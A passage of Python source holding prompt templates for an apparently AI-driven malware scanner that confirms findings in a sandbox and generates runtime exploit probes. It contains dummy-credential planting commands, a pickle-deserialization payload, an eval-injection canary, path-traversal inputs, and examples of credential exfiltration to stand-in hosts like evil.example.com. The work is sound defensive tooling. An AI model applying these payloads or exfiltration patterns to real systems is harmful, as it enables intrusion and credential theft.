malicious work. Crucially, **serving a response to a network call \
the file's own code initiates is environmental setup, not manufactured \
input**. Examples of valid environmental setup:
       - `mkdir -p ~/.ssh; echo 'KEY' > ~/.ssh/id_rsa` — dummy creds \
at standard paths.
       - `export COMPLIANCE_TOKEN=DEMO_TOKEN` — env var the file's \
own code reads.
       - `echo '_authToken=FAKE' > .npmrc` — fake credential at the \
expected file path.
       - **Spinning a mock HTTP/registry server that responds to URLs \
the file's own code chose to fetch** — e.g., the file does \
`urllib.urlopen("https://registry.example.com/manifest.js")` and we \
provide the response. We didn't manufacture the URL; the file's \
hardcoded code path did. Even if our response body is an executable \
script the file then exec's, the file's own code chose to fetch and \
exec from this URL — the malicious behavior is intrinsic to the file. \
The fact that we mocked the response makes the test reproducible; it \
doesn't make the file a passive vulnerability.
       - Setting `HOME=/home/runner` and pre-creating a workspace dir \
— execution prerequisites.
     If the plan's pre-target commands are limited to providing the \
environment the file's own code path expects (filesystem, env vars, \
network responses to file-initiated requests) → intrinsic.

   The decision rule: ask "**did the file's own code choose this \
input, or did the plan choose it for the file?**"
       - File chose it (URL hardcoded, env var the file reads, \
filesystem path the file walks) → INTRINSIC.
       - Plan chose it (CLI arg the plan crafted, file path the plan \
populated with hostile bytes, function call the plan made directly) \
→ EXPLOITABLE.

   ANTI-PATTERN to flag: do NOT classify a file as EXPLOITABLE just \
because the plan ran a mock server or provided a fake credential. \
That's environmental setup. EXPLOITABLE requires the plan's input \
to be on a code path the file would not have selected without our \
intervention.

   WORKED EXAMPLE — INTRINSIC (preinstall.py-style)

   L1 finding F003: `data_exfiltration severity=high` — file POSTs \
COMPLIANCE_TOKEN to telemetry endpoint at module load. Plan:

     process_spawn step=0 cmd="export COMPLIANCE_TOKEN=DEMO_TOKEN"
     process_spawn step=1 cmd="python3 preinstall.py"
     process_exit step=1 exit_code=1
       stdout_excerpt: "[preinstall] Telemetry POST sent to \
https://telemetry.example.com/api/v1/dep-audit
                        [preinstall] Header X-Compliance-Token=DEMO_TOKEN"

   The exfil fired from the file's OWN code path on direct invocation. \
The plan supplied only an env var (benign setup). With L1 also confirming \
F002 (.pth persistence) and F001 (exec at import), three confirmed \
findings span exfil + persistence + execution = 3 categories. \
Verdict: **`critical_malicious`** per chain-aggregation.

   WORKED EXAMPLE — EXPLOITABLE (megatron-style)

   L1 finding F001: `code_injection severity=high` — file uses \
`pickle.load` on attacker-supplied checkpoint path. Plan:

     process_spawn step=0 cmd="python3 - <<'PY'
                                import pickle
                                class Evil:
                                    def __reduce__(self):
                                        return (print, ('CVE-... exploited',))
                                with open('mal.ckpt','wb') as f: pickle.dump(Evil(),f)
                                PY"
     process_exit step=0 exit_code=0
     process_spawn step=1 cmd="python3 megatron_gpt2_loader.py mal.ckpt"
     process_exit step=1 exit_code=1
       stdout_excerpt: "Loading checkpoint
                        CVE-... exploited
                        Traceback: ..."

   The plan's step 0 manufactured a pickle bomb. The "exploited" marker \
appeared because the planted payload printed it, NOT because the loader \
intrinsically exfils. The file is EXPLOITABLE (unsafe pickle.load), \
but the file itself is not malware — it's a vulnerable loader.

   Verdict: **`suspicious`**. The exploit was input-driven (we supplied \
the hostile pickle); per the EXPLOITABLE branch above, the file-level \
verdict caps at `suspicious` regardless of L1's finding severity. F001 \
remains tagged `severity=high` at the finding level so the user sees \
the underlying CWE-502 risk; the file-level verdict reflects \
"vulnerable to attacker input" rather than "active malware."

   The hypothesis-level verdict is still **`confirmed`** for H001 (the \
runtime PoC succeeded — the unsafe pattern IS exploitable). What \
changes is the file-level rollup: `validated_findings: ["F001"]`, \
`confirmed_categories: ["execution"]`, `verdict_label: "suspicious"` \
(NOT `malicious`).

   The opposite case — if the plan hadn't manufactured the pickle bomb \
(e.g., just `python3 megatron_gpt2_loader.py /workspace/some_real.ckpt`) \
— no exploit would fire and H001 verdict would be `inconclusive`. \
Verdict_label still `suspicious` (≥1 inconclusive finding, no \
confirmed → suspicious per anchor table). Either way: `suspicious`.

   The file-level escalation to `malicious` or above only happens via \
the INTRINSIC branch — a file that emits malicious side effects from \
its own code path on direct invocation, with the plan supplying only \
benign environmental setup.

   Markers that count as exploit-demonstrated evidence:

   GENERIC EXPLOIT MARKERS
     - "exploited", "exploit successful", "RCE confirmed", "PoC \
successful", "POC SUCCESS"
     - "pwned", "INFECTED", "compromised", "breach"
     - CVE identifiers ("CVE-2025-...", "CVE-2024-...")
     - "shell access granted", "root access", "escalated privileges"

   EXFIL / NETWORK MARKERS
     - "Sent payload", "Exfil complete", "Connection successful", \
"Connection established", "POST successful", "Uploaded N bytes"
     - HTTP success codes embedded in stdout: "200 OK", "201 Created", \
"204 No Content" (when the target itself prints them, not just the \
shell wrapper)
     - Specific credentials or sensitive content visible in stdout \
that originated from the file's exfil code path: token strings, API \
keys, content of `/etc/passwd`, content of `~/.ssh/id_*`, content of \
`.git-credentials`

   PERSISTENCE MARKERS
     - File-path messages in stdout proving persistence was written: \
"Created .pth file at site-packages/", "crontab updated", "registry \
key HKLM/... set", "systemd unit installed at /etc/systemd/...", \
"Wrote dep_audit_compat.pth"
     - "Persistence installed", "Backdoor activated", "Auto-load \
configured"

   CODE-INJECTION MARKERS
     - "exec succeeded", "Code injection demonstrated"
     - Output that is the RESULT of injected code: a marker string \
the plan asked the exploit to print, output of `whoami` or `id`, \
content of files the injected code chose to read.

   CAPTURED-REQUEST MARKERS (from the mock-server pattern)
     - When a plan starts a local mock HTTP server and the malware \
hits it, the `cat /tmp/captured.json` (or equivalent) command's \
stdout will contain the captured request body / headers / path. \
That captured content IS the exfil payload — surfaced via stdout it \
counts as `exploit_demonstrated`.

   NETWORK_CALL_CAPTURED EVENTS (from iptables-redirected capture)
     - The sandbox automatically captures all outbound TCP 80/443 \
attempts via iptables NAT. Each captured attempt becomes a \
`network_call_captured` event with payload containing the request \
method/path/headers/body (for HTTP) OR the SNI hostname (for HTTPS \
TLS handshakes that fail because the local capture server can't \
present a valid cert). The presence of one or more \
`network_call_captured` events for a hypothesis testing exfil is \
strong confirmed-evidence: the malware DID attempt to make the \
outbound call, regardless of whether it succeeded at the application \
layer. Cite the `network_call_captured` event_id in the verdict.

   WORKED EXAMPLE — exploit fired then crashed, still confirmed

   Plan tests pickle deserialization with a malicious checkpoint:

     process_spawn step=1 cmd="python3 loader.py malicious.ckpt"
     process_exit step=1 exit_code=1
       stdout_excerpt: "INFO:loader:Loading checkpoint
                        CVE-2025-14924 exploited
                        Traceback (most recent call last):..."
       stderr_excerpt: "TypeError: ..."

   The plan caused the loader to deserialize the pickle, which invoked \
the attacker's `__reduce__` payload — that payload printed \
"CVE-2025-14924 exploited" to stdout. The script then crashed because \
the loader expected a real checkpoint structure after the pickle ran.

   Correct verdict: **confirmed**, citing the `process_exit` event_id, \
with rationale referencing the stdout marker. The script's subsequent \
crash does NOT downgrade this — the exploit's runtime side-effect (the \
marker in stdout) was observed.

   Wrong verdict: `inconclusive` ("the script crashed, so the exploit \
may not have worked") — the stdout shows the exploit DID work, \
regardless of what happened afterward.

   WORKED EXAMPLE — captured exfil via mock server

   Plan starts a Python mock HTTP server, redirects malware's exfil \
URL, runs the malware, dumps captures:

     process_exit step=4 exit_code=0  cmd="python3 /workspace/evil_loader.py"
       stdout_excerpt: ""  (target's own stdout was quiet)
     process_exit step=5 exit_code=0  cmd="cat /tmp/captured.json"
       stdout_excerpt: '{"path": "/api/v2/events", "headers":
         {"Authorization": "Bearer DEMO_TOKEN", ...},
         "body_excerpt": "{\\"git_credentials\\":
         \\"https://user:pass@github.com\\", \\"workspace_files\\":...}"}'

   The `cat` command's stdout contains the captured exfil POST body \
including credentials. This IS a runtime side-effect — the malware \
emitted a network call carrying sensitive data, captured by the mock \
server, and surfaced through the cat-command's stdout.

   Correct verdict: **confirmed**, citing the process_exit event_id of \
the `cat` command. Rationale: cite the captured headers and body \
content as evidence of exfil.

7. PEER-CONFIRMATION RULE — capture peer matches L1-tagged indicator \
THAT IS GROUNDED IN THE FILE'S SOURCE. A `network_call_captured` event \
whose **peer / SNI / qname matches a domain or URL the L1 extractions \
tagged as malicious AND whose literal text is also present in the \
file's source or a decoded payload** is confirmation of the file's \
INTRINSIC exfil/C2 behavior — independently of which hypothesis was \
being tested when the capture fired.

   Rationale: L1's `extractions.entities.domains[]` and \
`extractions.entities.urls[]` classify specific peers as `c2_suspect`, \
`c2_*_endpoint`, `data_exfiltration`, etc. But L1 occasionally \
fabricates entities (empirically observed: cloud-credential / IMDS \
domains attributed to ML/utility files that don't reference them). \
Peer-confirmation must therefore check BOTH (a) that the peer is in \
L1's extractions AND (b) that the peer literal actually appears in \
the file's source code or decoded payload. This grounding step blocks \
peer-confirmation from firing on an L1 fabrication that DAST happens \
to encounter via unrelated DNS noise.

   How to apply (do this BEFORE per-claim verdicts):

     (a) Walk all `network_call_captured` events in this iteration's \
         traces. For each event, extract the peer identifier:
           - `payload.sni` for `tls_clienthello` events
           - `payload.qname` for `dns_query` events
           - `payload.peer` (host:port) for raw TCP/HTTP captures
           - `payload.headers.host` for HTTP request captures
     (b) Check L1's `extractions.entities.domains[].value` and \
         `extractions.entities.urls[].value`. If any captured peer is \
         a substring match for an L1 entity whose context contains \
         `c2`, `exfil`, `command_and_control`, `malicious`, or similar \
         attacker-infrastructure tagging, advance to (c).
     (c) **GROUNDING CHECK (REQUIRED).** Verify the peer literal \
         appears in the file's source text shown in this prompt's INPUTS \
         block. The peer is *grounded* if:
           - The peer string appears verbatim in the source, OR
           - The peer string appears verbatim in a decoded payload \
             that the source produces (e.g., a `_PAYLOAD = "<b64>"` \
             string that the file decodes via `base64.b64decode` and \
             feeds to `exec`).
         **If the peer is NOT grounded** — i.e., L1 tagged it as a \
         malicious peer but the literal does not appear in the file's \
         text — peer-confirmation does NOT fire for this peer. Note \
         this in the verdict rationale ("peer X tagged by L1 but not \
         grounded in source; treating as L1 fabrication").
     (d) For grounded peers, the L1 `findings[]` entry whose `evidence` \
         references that peer (or whose category is \
         `data_exfiltration` / `network` / `command_and_control`) is \
         **confirmed by peer-match** — add it to `validated_findings` \
         and add `exfil` (or whatever category L1 assigned) to \
         `confirmed_categories`.

   This applies REGARDLESS of which hypothesis's plan triggered the \
network call. If the file's intrinsic code path runs (even as a side \
effect of a hypothesis testing something orthogonal) and the captured \
peer matches an L1-tagged indicator, the file's malicious intent is \
confirmed.

   The peer-match counts as a runtime side-effect event for Verdict \
Rule 1's "confirmed requires runtime evidence" gate.

   WORKED EXAMPLE — peer-confirmation across hypothesis frames

   Consider a file whose L1 extractions include:

     entities.domains: [{"value": "evil.example.com", "context": "c2_suspect"}]
     entities.urls:    [{"value": "https://evil.example.com/exfil",
                         "context": "C2 exfiltration endpoint"}]
     findings:         [{"id": "F001", "category": "data_exfiltration",
                         "severity": "high",
                         "evidence": "POST to evil.example.com/exfil"}]

   The plan for hypothesis H002 tests something different — say, command \
injection by sed-modifying the URL argument. H002's specific oracle is \
"shell command after semicolon executes (e.g., file creation)." When the \
sandbox runs the plan, the file's intrinsic exfil code path also fires, \
and the trace contains:

     network_call_captured kind=dns_query qname="evil.example.com"
                            responded_with="127.0.0.1"
     network_call_captured kind=tls_clienthello sni="evil.example.com"

   `/tmp/injected.txt` did NOT appear, so H002's command-injection oracle \
is NOT satisfied → H002 verdict = `inconclusive`.

   But the captured peer `evil.example.com` matches L1's c2_suspect \
domain entry. Apply the peer-confirmation rule: F001 is **confirmed** \
by peer-match. Even though the hypothesis under test (H002) failed its \
oracle, the file's intrinsic exfil behavior fired and was observed.

   Resulting verdict structure:

     claim_verdicts: [
       {"hypothesis_id": "H002", "verdict": "inconclusive", ...},
     ]
     current_verdict: {
       "verdict_label": "malicious",   // F001 is high-severity
                                         // data_exfiltration, intrinsic
       "validated_findings": ["F001"],
       "confirmed_categories": ["exfil"],
       "log_summary": "F001 confirmed by peer-match: captured DNS+TLS to
                       evil.example.com (L1 c2_suspect) during H002 trace."
     }

   If F001 had been `severity=critical` OR if multiple intrinsic \
categories had been confirmed (e.g., F001 exfil + L1 also tagged a \
persistence finding that the trace evidenced separately), \
`critical_malicious` per the chain-aggregation anchor below.

   Wrong verdict: `suspicious` ("the captured network calls were not \
the side-effect of the hypothesis under test"). Hypothesis-scoped \
tunnel vision ignores the file's intrinsic malicious behavior firing \
in plain view of the sandbox capture infrastructure.

CHAIN-AGGREGATION ANCHOR — set-union semantics (read carefully)

current_verdict.verdict_label is determined by aggregating across all \
confirmed hypotheses + L1 behavior signal. Categorize each confirmed \
finding into ATTACK CATEGORIES:

  EXECUTION:    arbitrary code execution (exec, eval, shell, deserialization)
  PERSISTENCE:  long-lived install (.pth, sitecustomize, cron, registry)
  EXFIL:        data leaving the host (HTTP POST, DNS, log file)
  PRIV_ESC:     privilege escalation
  CREDENTIAL:   credential access / theft
  TAMPER:       integrity violation of host artifacts

**PRECONDITION (READ FIRST):** the anchors below apply ONLY to \
confirmed findings that are INTRINSIC per Rule 6a — i.e., the file's \
own code emitted the malicious side effect, with the plan supplying \
only benign environmental setup. Confirmed findings that are \
EXPLOITABLE-under-attacker-input per Rule 6a (the plan manufactured \
the hostile payload) do NOT contribute to escalation; per Rule 6a, \
the file-level verdict caps at `suspicious` regardless of how many \
EXPLOITABLE findings were confirmed or how severe their underlying \
patterns are.

If ALL confirmed findings are EXPLOITABLE-under-input → verdict_label \
= `suspicious`. Skip the anchor table.

If at least one confirmed finding is INTRINSIC → apply the anchor \
table below using only the INTRINSIC findings.

CATEGORIZATION — by behavior, not just by L1's `findings[].type`

Before applying the anchor table, categorize each confirmed finding by \
**what the file actually did at runtime**, not just by L1's coarse \
`findings[].type` label. A single finding can legitimately span \
multiple categories when its data flow touches multiple attack-class \
boundaries.

The most common multi-category case in this corpus is **credential \
exfil** — a finding that both reads sensitive credential material AND \
sends it outbound. L1 typically tags this `data_exfiltration` (single \
EXFIL category), but the runtime behavior covers BOTH:

  * **CREDENTIAL** — the data being exfiltrated is itself \
sensitive credential material:
    - SSH keys (anything in `~/.ssh/`, `id_rsa`, `id_ed25519`, etc.)
    - API tokens / OAuth tokens (`_authToken`, `OPENAI_API_KEY`, \
`ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, `HUGGINGFACE_HUB_TOKEN`, etc.)
    - Cloud credentials (`AWS_SECRET_ACCESS_KEY`, IMDS tokens, \
service account JSON)
    - `.env` file contents, `.npmrc` contents with token values
    - Password files, password hashes, browser-stored credentials
  * **EXFIL** — the data leaves the host via outbound HTTP / DNS / \
log file / etc.

When the same confirmed finding satisfies BOTH credential reading AND \
outbound exfil, count it under **both** `credential` and `exfil` \
categories in `confirmed_categories`. This is one finding contributing \
two categories to the chain-aggregation union — not because we're \
double-counting, but because the file's runtime behavior actually \
crossed both attack-class boundaries.

Other behavior-driven multi-category cases (less common in this corpus):

  * EXECUTION + PERSISTENCE — a `.pth` file that imports a module \
which runs arbitrary code AND installs a persistence hook.
  * EXECUTION + EXFIL — code-injection that, once running, also POSTs \
the host's data outbound.
  * CREDENTIAL + PRIV_ESC — credential theft that bootstraps a \
privilege-escalation chain.

  * **`.pth` FILE WITH ACTIVE IMPORT — automatic PERSISTENCE.** Python's \
`site.py` runs every `import …` line in a `.pth` file at every Python \
interpreter startup. **A `.pth` file with an active import IS a \
persistence mechanism by definition** — the file installs into Python's \
auto-load path (site-packages) and re-runs on every interpreter \
launch. When a `.pth` file's confirmed behavior is exfil / exec / \
credential-access, count it as **PERSISTENCE + that-behavior** (≥2 \
categories), regardless of whether L1 explicitly tagged a separate \
persistence finding. The persistence is structural to the `.pth` \
mechanism, not a separate code path.

    Examples:
      - `compat_hooks.pth` with `import compat_loader; compat_loader.bootstrap()` \
where `bootstrap()` exfils credentials → PERSISTENCE + EXFIL = 2 \
categories → critical_malicious via anchor (b).
      - `sitecustomize_inject.pth` with `import malicious_setup` where \
`malicious_setup.__init__` runs arbitrary code → PERSISTENCE + EXECUTION.

    The same logic applies to other auto-load mechanisms: \
`sitecustomize.py` in site-packages, `usercustomize.py`, kernel module \
auto-load entries, systemd unit drops in standard locations, cron file \
writes to `/etc/cron.d/`. **If the file is a known auto-execution \
vector AND has any confirmed malicious behavior, count PERSISTENCE in \
addition to that behavior.**

Categorize honestly. Don't invent multi-category coverage where the \
runtime evidence doesn't support it. But also don't let L1's \
single-category `findings[].type` tag artificially compress what the \
file actually did.

Anchor table (apply the FIRST rule that matches, top to bottom):

  critical_malicious — ANY of:
    (a) ≥1 confirmed INTRINSIC finding has severity = "critical", OR
    (b) the UNION of confirmed-INTRINSIC-finding categories covers ≥2 of
        {execution, persistence, exfil, priv_esc, credential, tamper}, OR
    (c) the UNION of confirmed-INTRINSIC-finding MITRE ATT&CK techniques
        spans ≥2 tactics.
    The "union" is taken across ALL confirmed findings AND each
    finding's behavior-driven multi-category coverage (per the
    CATEGORIZATION section above). A single confirmed credential-exfil
    finding contributes BOTH `credential` and `exfil` to the union →
    triggers anchor (b) on its own.

    IMPORTANT: only "confirmed" verdicts (per Verdict Rule 1 above —
    runtime side-effect event required) count toward (a)-(c).
    "inconclusive" claims (including pattern-only-observed claims) do
    NOT count, because their exploitability has not been demonstrated.

  malicious — confirmed findings exist, severity is high or medium, AND
    the union of categories covers exactly 1 of the listed categories.

  suspicious — ≥1 inconclusive finding, no confirmed.

  informational — only cosmetic / non-security findings.

  clean — no findings.

WORKED EXAMPLE 1 — three confirmed findings spanning multiple categories

Suppose Phase A confirms three L1 findings on a hypothetical file:
  F1: SQL injection via f-string query (severity: high, category: EXECUTION)
  F2: API key leaked to stdout in error path (severity: medium, category: EXFIL)
  F3: Log file written world-readable (severity: low, category: TAMPER)

Union of confirmed-finding categories = {EXECUTION, EXFIL, TAMPER} = 3 \
categories. Anchor (b) triggers → verdict_label = "critical_malicious".

If only F1 + F3 had been confirmed (categories {EXECUTION, TAMPER} = 2), \
anchor (b) still triggers → still "critical_malicious".

If only F1 had been confirmed (category {EXECUTION} = 1), anchor (b) \
does not trigger; severity high → "malicious".

WORKED EXAMPLE 2 — single finding with behavior-driven multi-category

L1 reports a single F001: `data_exfiltration severity=high` — file \
reads `~/.ssh/id_rsa` and POSTs the contents to a hardcoded C2. Phase \
A confirms via Rule 7 peer-match (network_call_captured to the C2; L1 \
tagged the C2 c2_suspect; peer literal grounded in the file's source).

L1's `findings[].type` is `data_exfiltration`, which would trivially \
map to a single EXFIL category. But the runtime behavior reads SSH \
keys (CREDENTIAL access) AND sends them outbound (EXFIL). Apply the \
CATEGORIZATION section above:

  confirmed_categories: ["credential", "exfil"]   (NOT just ["exfil"])

Union of confirmed categories = {CREDENTIAL, EXFIL} = 2 → anchor (b) \
triggers → verdict_label = "critical_malicious".

This is the correct outcome even though L1 may have graded severity as \
`high` instead of `critical` (anchor (a) would miss). Behavior-driven \
category counting carries the rollup independently of L1's severity \
grading drift.

OUTPUT REQUIREMENTS

claim_verdicts: one entry per L1 hypothesis.
  - sandbox_event_ids: non-empty list for confirmed/refuted; may be \
empty for inconclusive.
  - rationale: must reference the cited events' payload fields, not the \
L1 finding's explanation text.

current_verdict:
  - verdict_label: per the anchor table above.
  - log_summary: ≤250 chars; mention which categories drove the verdict.
  - validated_findings: list of L1 finding IDs the trace confirms.
  - confirmed_categories: list from {execution, persistence, exfil, \
priv_esc, credential, tamper}. This is the audit trail showing your \
aggregation.
"""


_PHASE_B_BODY = """\
You are the exploratory component of an AI security scanner. The L1 \
static-analysis stage and Phase A sandbox verification have produced \
confirmed findings. Your job NOW is to identify what L1 missed.

THE UPSTREAM-CAUSATION REASONING PATTERN

L1 finds the malicious BEHAVIOR. You find the upstream CONDITION that \
made that behavior land here — the delivery mechanism, infrastructure \
trust assumption, or process gap that is the precondition. The upstream \
condition is often more material than the behavior itself: fixing the \
behavior plugs one hole; fixing the upstream condition prevents the \
attack class.

For each confirmed finding from L1 + Phase A, ask three questions IN ORDER:

  Q1: What had to be true upstream for this attack to land HERE in this \
      file specifically (rather than be rejected before reaching here)?
  Q2: What infrastructure trust, process gap, or delivery mechanism is \
      the precondition?
  Q3: Where in the file is that precondition declared or visible? It is \
      often OUTSIDE the code body — in header comments, the module \
      docstring, manifest declarations, build/CI configuration, or the \
      filename itself.

Each new hypothesis you propose corresponds to one upstream condition \
you identified. Hypotheses test whether the upstream condition is \
actually exploitable, not whether L1's already-confirmed finding is real.

WORKED EXAMPLE — DIFFERENT ATTACK TYPE
(Learn the reasoning pattern. Do NOT pattern-match on the example's \
specific vocabulary; you must apply the same pattern to whatever file \
you see.)

Suppose L1 confirms a finding in a GitHub Actions workflow file: a step \
uses ${{ secrets.NPM_TOKEN }} and runs actions/setup-node@v3 (line 8) \
before npm publish (line 12). L1 finding F-exfil: "secret used in \
untrusted context." Phase A confirms the secret reaches the npm registry \
call.

Upstream reasoning, applying Q1-Q2-Q3:
  Q1: What had to be true upstream for the secret to reach this risky \
      context? The workflow had to RUN the third-party action at all.
  Q2: What's the precondition? actions/setup-node@v3 is a TAG, not a \
      SHA hash — the action's contents are mutable. An attacker who \
      controls the upstream action's tag-pointer can swap in code that \
      runs in the secrets-bearing context.
  Q3: Where is the precondition visible? Line 8 of the workflow file: \
      `uses: actions/setup-node@v3`. Tag pin, not SHA pin. Visible at \
      configuration time, before any runtime execution.

Phase B hypothesis derived from that reasoning would have:
  description: "An attacker controlling the actions/setup-node tag can \
read secrets.NPM_TOKEN because line 8 references the action by mutable \
tag rather than by SHA."
  evidence_basis: { type: "code_pattern", \
ref: "line 8: uses: actions/setup-node@v3", \
why_relevant: "Tag references resolve to whatever commit the tag \
currently points at; SHA references are immutable. The unpinned tag is \
the supply-chain delivery vector for the secret-exfil F-exfil targeted." }
  upstream_chain: { confirmed_finding_ref: "F-exfil", \
upstream_condition: "third-party action is unpinned (tag, not SHA)", \
evidence_location: "line 8" }
  scope: { lines_start: 8, lines_end: 8 }

The example demonstrates: L1 found the BEHAVIOR (secret-exfil at line \
12); upstream reasoning identified the CONDITION (unpinned action at \
line 8) that made the exfil land in this workflow at all. The Phase B \
hypothesis tests the precondition, not the behavior.

WHAT FAILS THE PATTERN (these are NOT upstream-reasoning hypotheses, \
and the validator will drop them)

  - "L1 might also find X" — that is L1 restated, not upstream causation.
  - "An attacker could potentially modify Y" — speculative future code; \
not a present precondition.
  - "If the file were run as root..." — hypothetical environment change \
not declared in the file.
  - "The same exec pattern could appear elsewhere" — generalization, not \
upstream causation in THIS file.

CRITERIA YOUR HYPOTHESES MUST MEET

R1 SPECIFIC: single testable claim with line-range scope (≤50 lines), \
payload or test action, observable side effect.

R2 BOUNDED: single oracle, single environment_complexity. \
multi_service / distributed → not propose; mark out of scope.

R3 EVIDENCE-DRIVEN: evidence_basis.ref points to a concrete location or \
finding ID. upstream_chain MUST be fully populated:
  - confirmed_finding_ref must match one of the confirmed F### findings \
in the journal summary.
  - upstream_condition must be specific (not "supply chain risk", but \
"third-party action is unpinned").
  - evidence_location must be a line range or named non-code artifact \
(e.g. "module docstring lines 6-21", "package.json scripts.postinstall").

WHEN TO STOP

If you have enumerated upstream conditions for every confirmed finding \
AND none point to a material new dimension that L1 didn't already cover, \
set stop_reason="all_dimensions_explored" and return new_hypotheses=[]. \
Padding hypotheses wastes budget; honest stops save it.

ALSO REQUIRED IN OUTPUT

non_code_regions_inspected: list every non-code region of the file you \
considered (header comments, module docstring, manifest, build config, \
filename, etc.). This is the audit trail for self-accountability — if \
your reasoning didn't actually inspect the file's header, list nothing.
"""


def _format_inputs(file_text: str, l1_output: dict, journal_summary: Any) -> str:
    file_label = "file"
    if isinstance(l1_output, dict):
        # Try to recover a useful filename from the L1 record if present.
        for key in ("file_name", "filename", "path"):
            if key in l1_output:
                file_label = str(l1_output[key])
                break
    return (
        f"\n\nINPUTS\n"
        f"=== File source: {file_label} ===\n{file_text}\n\n"
        f"=== L1 output (compact) ===\n"
        f"{json.dumps(l1_output, indent=2, ensure_ascii=False)}\n\n"
        f"=== Phase A journal summary ===\n"
        f"{json.dumps(journal_summary, indent=2, ensure_ascii=False, default=str)}\n\n"
        f"Output JSON conforming to the provided schema."
    )


def build_phase_a_plan_prompt(
    file_text: str,
    l1_output: dict,
    journal_summary: Any,
    pending_hypotheses: list[dict] | None = None,
) -> str:
    """Phase A — plan generation. journal_summary is reserved for iter ≥ 2;
    pending_hypotheses additionally accepts Phase-B accepted hypotheses
    that need plans on top of L1's hypotheses."""
    payload = _format_inputs(file_text, l1_output, journal_summary)
    if pending_hypotheses:
        payload += (
            "\n\n=== Additional Phase-B hypotheses needing plans ===\n"
            f"{json.dumps(pending_hypotheses, indent=2, ensure_ascii=False)}"
        )
    return _PHASE_A_PLAN_BODY + payload


def build_phase_a_verdict_prompt(
    file_text: str,
    l1_output: dict,
    plans: list[dict],
    traces: list[dict],
    journal_summary: Any,
) -> str:
    payload = (
        f"\n\nINPUTS\n"
        f"=== File source ===\n{file_text}\n\n"
        f"=== L1 output (compact) ===\n"
        f"{json.dumps(l1_output, indent=2, ensure_ascii=False)}\n\n"
        f"=== Phase A plans (this iteration) ===\n"
        f"{json.dumps(plans, indent=2, ensure_ascii=False)}\n\n"
        f"=== Sandbox traces (this iteration) ===\n"
        f"{json.dumps(traces, indent=2, ensure_ascii=False)}\n\n"
        f"=== Phase A journal summary (prior iterations) ===\n"
        f"{json.dumps(journal_summary, indent=2, ensure_ascii=False, default=str)}\n\n"
        f"Output JSON conforming to the provided schema."
    )
    return _PHASE_A_VERDICT_BODY + payload


def build_phase_b_prompt(
    file_text: str,
    l1_output: dict,
    journal_summary: Any,
) -> str:
    payload = _format_inputs(file_text, l1_output, journal_summary)
    return _PHASE_B_BODY + payload


# ── Phase B+ — Runtime exploit probing (v1.5) ──────────────────────────────
#
# A new discovery mode: rather than asking the model to brainstorm
# vulnerabilities from static reading + journal evidence, we ask it to
# (a) identify probe-attractive functions and (b) generate concrete
# attack inputs that would prove the vulnerability if it actually
# fires at runtime. The orchestrator then runs each input in the
# sandbox and emits CONFIRMED findings from runtime evidence rather
# than from model speculation.
#
# Scope: Python files only in v1.5. The prompt rejects non-Python
# files and the schema only emits Python-callable function names.


_PHASE_B_RUNTIME_PROBE_BODY = """\
You are an adversarial penetration tester. You are given a Python source
file and Phase A's evidence about what the file does at runtime. Your job
is to identify functions worth attacking with concrete inputs at runtime
in a sandboxed microVM, and to generate those concrete inputs.

You are NOT writing more static analysis. You are GENERATING runtime
test cases. The sandbox will actually execute your inputs and report
back what happened. Then you decide whether the observed behavior
proves the file is vulnerable.

DESIGN PRINCIPLES:

1. Pick functions that are reachable from outside (top-level module
   functions, public methods of classes). Skip private helpers
   (`_name`), test fixtures, and __init__ unless they take
   user-controlled input.

2. For each function, identify the ATTACK CLASS it's most likely
   vulnerable to based on its signature + body:
   - takes a path string → path_traversal
   - takes a command/shell string → command_injection
   - takes data fed to eval/exec/compile → code_injection
   - takes data fed to pickle.loads → deserialization
   - takes a URL fetched server-side → ssrf
   - takes a SQL fragment → sql_injection
   - returns sensitive process data → data_exfiltration
   Pick AT MOST ONE attack class per candidate; if multiple are
   plausible, pick the one most likely to produce observable runtime
   evidence in 30 seconds.

3. For each candidate, generate UP TO 3 attack inputs. Each input
   must include:
   - `args_json`: JSON-encoded list of positional args
   - `kwargs_json`: JSON-encoded dict (use "{}" if none)
   - `expected_observable`: what the sandbox will see if the exploit
     fires. Concrete and observable: "file /tmp/argus_probe_X gets
     created", "function returns content of /etc/passwd",
     "subprocess.run is called with shell=True", "raises
     PermissionError instead of returning normally".
   - `exploit_proof_if_observed`: the vulnerability finding text
     that lands IF the observable matches.

4. PREFER canary patterns. When safe, embed marker strings in attack
   inputs so the sandbox can see them materialize. Example: for a
   suspected `eval(user_input)`, use input
   `__import__('os').system('touch /tmp/argus_probe_pwned')`. The
   side-effect file is unambiguous evidence the eval fired. For
   path-traversal, an input like `../../../tmp/argus_probe_pwned`
   that the function might WRITE to is the canary.

5. DO NOT generate inputs that would crash the sandbox host, attempt
   to break out of the microVM, or perform network exfiltration to
   real attacker-controlled hosts. The sandbox has KVM-level isolation
   and the test infrastructure should not be visible.

6. If the file has NO probe-attractive functions (e.g., it's pure
   data declarations, only contains imports, or only defines tests),
   return an empty `candidates` array and set
   `non_probable_reason` appropriately. Don't manufacture findings.

CONSTRAINTS (the schema enforces these — listed here for transparency):

- AT MOST {MAX_CANDIDATES} candidate functions.
- AT MOST {MAX_INPUTS_PER_CANDIDATE} test inputs per candidate.
- ONLY top-level functions or `Class.method` paths. No closures, no
  inner functions, no test helpers.
- `function_name` must match the regex `^[A-Za-z_][A-Za-z0-9_]*(\\.[A-Za-z_][A-Za-z0-9_]*)?$`.
- `attack_class` must be one of the documented enum values.

==== INPUTS ====
"""


def phase_b_runtime_probe_schema() -> dict[str, Any]:
    """JSON schema for Phase B+ runtime-probe candidate generation."""
    return {
        "type": "object",
        "additionalProperties": False,
        "required": ["candidates", "non_probable_reason"],
        "properties": {
            "non_probable_reason": {
                "type": "string",
                "description": (
                    "Empty when at least one candidate is emitted. Populated "
                    "with a short reason when the file has no probe-attractive "
                    "functions (e.g., 'pure data declarations', 'test file', "
                    "'only re-exports', 'non-Python file format')."
                ),
            },
            "candidates": {
                "type": "array",
                "maxItems": 3,
                "items": {
                    "type": "object",
                    "additionalProperties": False,
                    "required": [
                        "function_name",
                        "attack_class",
                        "rationale",
                        "test_inputs",
                    ],
                    "properties": {
                        "function_name": {
                            "type": "string",
                            "pattern": r"^[A-Za-z_][A-Za-z0-9_]*(\.[A-Za-z_][A-Za-z0-9_]*)?$",
                            "maxLength": 120,
                        },
                        "attack_class": {
                            "type": "string",
                            "enum": [
                                "path_traversal",
                                "code_injection",
                                "command_injection",
                                "deserialization",
                                "data_exfiltration",
                                "ssrf",
                                "sql_injection",
                                "xss",
                                "xxe",
